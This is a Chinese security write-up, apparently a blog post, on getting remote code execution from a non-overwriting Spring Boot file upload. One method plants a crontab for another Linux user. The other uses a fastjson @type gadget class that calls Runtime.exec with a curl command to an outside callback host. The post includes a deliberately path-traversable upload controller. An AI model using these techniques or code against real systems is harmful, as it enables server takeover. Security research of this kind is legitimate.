# Spring Boot文件上传不能覆盖的两种RCE方法

在挖洞的时候，碰到了开源项目，发现有一个任意文件上传漏洞，但是不能覆盖，就有了这篇文章，虽然当时没有成功getshell，但是研究出来两个可行的思路（后续发现是当时有个小问题导致的，重新去看实现了rce，奈何项目结束了）

## 审计过程

pom引用了两个fastjson版本

<img width="371" alt="image" src="https://github.com/user-attachments/assets/2ab0264a-461f-4516-ad8a-bb57aa231ae5">

<img width="359" alt="image" src="https://github.com/user-attachments/assets/d04566dd-97b1-47e4-9bdc-16ece8520747">

在使用的时候会默认使用高版本，也就是1.2.75，然而1.2.75貌似是有漏洞，我在研究了很久发现犯了一个傻逼的错误，他并没有任何代码把json字符串反序列化为object类，都是转为他自己写的类，所以这条线索就断了，感谢chen师傅的帮助

<img width="397" alt="image" src="https://github.com/user-attachments/assets/b7ede7eb-3c7e-4158-8352-7bc21b10601b">

也就是说类似于这样的代码，完全不可能通过传统的办法rce

<img width="804" alt="image" src="https://github.com/user-attachments/assets/d9fd4320-dbdd-44f5-8d8f-42d05323b893">

所以陷入了僵局

## 1.定时任务的其他用户文件

但是在查看代码的时候发现

<img width="729" alt="image" src="https://github.com/user-attachments/assets/7ae71dca-7b1c-4799-93cb-aa408502205b">

uploadFile方法：

<img width="552" alt="image" src="https://github.com/user-attachments/assets/03ccd22f-20a9-47c6-aa60-6d2da8b20bee">

直接上传到服务器的，并且路径可控

但是验证了文件是否存在，存在就加一个（1），在理论上很难找到有一个可以rce的文件是以类似于test（1）这样命名的

如果是可以覆盖的情况下，我们可以直接覆盖定时任务的文件（像redis定时任务rce那样，只不过我们是覆盖，redis是写入）

Centos 的定时任务文件在 /var/spool/cron/<username>
Ubuntu 的定时任务文件在 /var/spool/cron/crontabs/<username>

以centos为例

那么我们就可以覆盖/var/spool/cron/root这个文件实现rce

但是这里我们不能覆盖，只能增加文件

我们可以增加其他用户的定时任务，因为默认情况下是没有任何文件的，就算是有也大概率是root

<img width="337" alt="image" src="https://github.com/user-attachments/assets/44af5b24-45ad-4504-9ffb-df164cb785a0">

那么我们可以通过上传文件/var/spool/cron/daemon（找到一个一般Linux都有的用户名）从而实现定时任务rce，只不过拿到的权限不是root

我自己写了一个场景复现这种情况

```
package com.beishan.controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import java.io.File;
import java.io.IOException;
 
@RestController
public class FileUploadController {
    private static final String UPLOAD_DIR = "/uploads/";
 
    @PostMapping("/upload")
    public String handleFileUpload(@RequestParam("file") MultipartFile file) {
        if (file.isEmpty()) {
            return "Please select a file to upload.";
        }
        try {
            byte[] bytes = file.getBytes();
            String uploadDir = "src/main/resources/uploads";
            String workingDir = System.getProperty("user.dir");
            System.err.println(workingDir + UPLOAD_DIR + file.getOriginalFilename());
            File uploadedFile = new File(workingDir + UPLOAD_DIR + file.getOriginalFilename());
            if(uploadedFile.exists()){
                return "File exists!";
            }
            file.transferTo(uploadedFile);
            return "File uploaded successfully!";
        } catch (IOException e) {
            e.printStackTrace();
            return "File upload failed!";
        }
    }
}
```

<img width="947" alt="image" src="https://github.com/user-attachments/assets/78c2f6af-a773-41b3-8cea-675dab6d2c5c">

但是出了个小问题，不知道为什么会有个乱码
<img width="676" alt="image" src="https://github.com/user-attachments/assets/c4905492-c866-4489-9810-469a381ae372">

排查了很久发现这个位置的0d得改成0a，不知道为什么会这样（可能是mac的编码和centos有区别？）,当时就是这个原因没有rce

<img width="610" alt="image" src="https://github.com/user-attachments/assets/23b7e362-645a-43c6-ad98-157992b70653">

成功带出whoami

<img width="1119" alt="image" src="https://github.com/user-attachments/assets/263bdabb-ad49-48a3-9c5f-14fd07089496">

## 2.fastjson反序列化（鸡肋）

在开始阅读之前请看前辈们的文章：https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks

fastjson后续的版本都做了黑名单，但是自己写的类是可以通过@type的方法反序列化的（以1.2.83为例）

有个前提条件：

必须知道java加载类的路径

在linux上执行
```
java -XshowSettings:properties -version
```
<img width="777" alt="image" src="https://github.com/user-attachments/assets/f6f841d6-6731-4cb3-942f-9bef844699ce">

所以说这个思路鸡肋，这猜出来的可能性太小了，当时我也没猜成功

攻击的路径就是，我们上传一个自己写的java编译jar包（得继承他反序列化的那个类），然后使用@type的方法反序列化这个类的时候会执行我们定义的代码

比如这种代码

```
package code;

import com.alibaba.fastjson.JSON;

public class test {
    public static void main(String[] args){
        String str="{\"@type\":\"code.user2\",\"name\":\"curl dd.chain2.eyes.sh\"}";
        System.out.println(str);
        System.out.println("Classpath: " + System.getProperty("java.class.path"));
        JSON.parseObject(str,user.class).getName();
    }
}
```

我们就得这样写一个user2

```
package code;

import java.io.IOException;

public class user2 extends user{
    private String name;
    public void setName(String name) throws IOException {
        Runtime.getRuntime().exec(name);
        this.name = name;
    }
    public String getName() {
        return this.name;
    }
}
```

将jar包放到类加载的目录下

当code.user2反序列化的时候就会执行Runtime.getRuntime().exec(name);

<img width="1083" alt="image" src="https://github.com/user-attachments/assets/6a5056cf-1be5-489f-8ec5-9a7d8e766598">

# 总结

以上就是这篇文章介绍的在SpringBoot环境中文件不能覆盖文件情况下rce的两种方法，经过这次的项目意识到了自己的不足以及和大佬的差距，还是得加油学习！！
